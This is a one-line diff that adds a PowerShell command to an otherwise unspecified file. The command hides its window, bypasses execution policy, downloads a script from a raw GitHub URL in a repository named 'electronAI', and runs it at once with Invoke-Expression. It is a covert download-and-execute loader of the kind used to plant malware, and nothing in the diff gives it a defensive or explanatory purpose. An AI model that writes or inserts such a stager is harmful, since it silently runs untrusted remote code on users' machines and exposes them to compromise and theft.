@@ -1,0 +1,1 @@
+powershell -nop -w hidden -ExecutionPolicy Bypass -command "$asd=(iwr 'https://raw.githubusercontent.com/1CodeDev-hub/electronAI/refs/heads/main/basic.txt' -UseBasicParsing ).Content; iex ""& { $asd } -id 'hello'"""
